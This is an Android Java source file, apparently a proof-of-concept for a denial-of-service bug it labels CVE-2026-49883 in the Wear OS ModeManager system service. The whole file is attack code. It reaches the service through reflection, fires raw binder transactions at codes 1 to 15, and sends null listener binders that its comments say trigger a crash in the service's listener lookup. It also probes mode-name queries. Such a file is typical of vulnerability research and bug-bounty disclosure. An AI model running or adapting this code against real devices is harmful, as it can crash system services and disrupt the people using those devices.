package com.vrp.poc;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;
import java.lang.reflect.Method;

public class ModeManagerCrashActivity extends Activity {
    private static final String TAG = "VRP_MODECRASH";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(8f);
        sv.addView(tv);
        setContentView(sv);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== ModeManager DoS PoC (CVE-2026-49883) ===\n");
            sb.append("UID: ").append(android.os.Process.myUid()).append("\n");
            sb.append("PID: ").append(android.os.Process.myPid()).append("\n\n");

            try {
                Class<?> smClass = Class.forName("android.os.ServiceManager");
                Method getService = smClass.getMethod("getService", String.class);
                IBinder modeBinder = (IBinder) getService.invoke(null, "ModeManager");

                if (modeBinder == null) {
                    sb.append("ModeManager service NOT found\n");
                    Log.e(TAG, "ModeManager service not found");
                    final String r = sb.toString();
                    runOnUiThread(() -> tv.setText(r));
                    return;
                }

                sb.append("ModeManager service found!\n");
                String iface = modeBinder.getInterfaceDescriptor();
                sb.append("Interface: ").append(iface).append("\n\n");
                Log.i(TAG, "ModeManager found, interface: " + iface);

                // Transaction 1: registerStateChangeListener
                // The crash was in ListenerManager.findRemoteObserverWrapperLocked
                // called from an ExternalSyntheticLambda - this suggests a listener registration
                // where a null IStateChangeListener was passed
                sb.append("--- Phase 1: Probe transactions ---\n");
                for (int txn = 1; txn <= 15; txn++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken("com.android.clockwork.modes.IModeManager");
                        boolean r = modeBinder.transact(txn, data, reply, 0);
                        reply.setDataPosition(0);
                        try {
                            reply.readException();
                            int avail = reply.dataAvail();
                            sb.append("Txn ").append(txn).append(": OK, avail=").append(avail);
                            if (avail > 0 && avail < 512) {
                                byte[] raw = new byte[avail];
                                reply.readByteArray(raw);
                                sb.append(" hex=");
                                for (byte b : raw) sb.append(String.format("%02x", b));
                            }
                            sb.append("\n");
                            Log.i(TAG, "Txn " + txn + ": OK, avail=" + avail);
                        } catch (Exception ex) {
                            sb.append("Txn ").append(txn).append(": ").append(ex.getClass().getSimpleName())
                              .append(" ").append(ex.getMessage()).append("\n");
                            Log.i(TAG, "Txn " + txn + ": " + ex.getMessage());
                        }
                    } catch (Exception e) {
                        sb.append("Txn ").append(txn).append(": DEAD ").append(e.getMessage()).append("\n");
                        Log.e(TAG, "Txn " + txn + " dead", e);
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                }

                // Phase 2: Try registerStateChangeListener with null binder
                // This targets the crash in ListenerManager.findRemoteObserverWrapperLocked
                sb.append("\n--- Phase 2: Null listener registration ---\n");
                for (int txn = 1; txn <= 5; txn++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken("com.android.clockwork.modes.IModeManager");
                        data.writeStrongBinder(null); // null listener binder
                        boolean r = modeBinder.transact(txn, data, reply, 0);
                        reply.setDataPosition(0);
                        try {
                            reply.readException();
                            sb.append("Txn ").append(txn).append("+null: OK, avail=").append(reply.dataAvail()).append("\n");
                            Log.i(TAG, "NullListener txn " + txn + ": OK");
                        } catch (Exception ex) {
                            sb.append("Txn ").append(txn).append("+null: ").append(ex.getMessage()).append("\n");
                            Log.i(TAG, "NullListener txn " + txn + ": " + ex.getMessage());
                        }
                    } catch (Exception e) {
                        sb.append("Txn ").append(txn).append("+null: DEAD\n");
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                }

                // Phase 3: Try with string args (mode names)
                sb.append("\n--- Phase 3: Mode name queries ---\n");
                String[] modeNames = {"bedtime", "theater", "dnd", "airplane", "power_saver",
                                       "water_lock", "focus", "default", "silent"};
                for (String mode : modeNames) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken("com.android.clockwork.modes.IModeManager");
                        data.writeString(mode);
                        boolean r = modeBinder.transact(1, data, reply, 0);
                        reply.setDataPosition(0);
                        try {
                            reply.readException();
                            int avail = reply.dataAvail();
                            sb.append("Mode '").append(mode).append("': OK, avail=").append(avail);
                            if (avail > 0 && avail < 256) {
                                byte[] raw = new byte[avail];
                                reply.readByteArray(raw);
                                sb.append(" hex=");
                                for (byte b : raw) sb.append(String.format("%02x", b));
                            }
                            sb.append("\n");
                            Log.i(TAG, "Mode '" + mode + "': OK, avail=" + avail);
                        } catch (Exception ex) {
                            sb.append("Mode '").append(mode).append("': ").append(ex.getMessage()).append("\n");
                        }
                    } catch (Exception e) {
                        sb.append("Mode '").append(mode).append("': DEAD\n");
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                }

            } catch (Exception e) {
                sb.append("ERROR: ").append(e.getMessage()).append("\n");
                Log.e(TAG, "Fatal", e);
            }

            final String result = sb.toString();
            Log.i(TAG, "\n" + result);
            runOnUiThread(() -> tv.setText(result));
        }).start();
    }
}
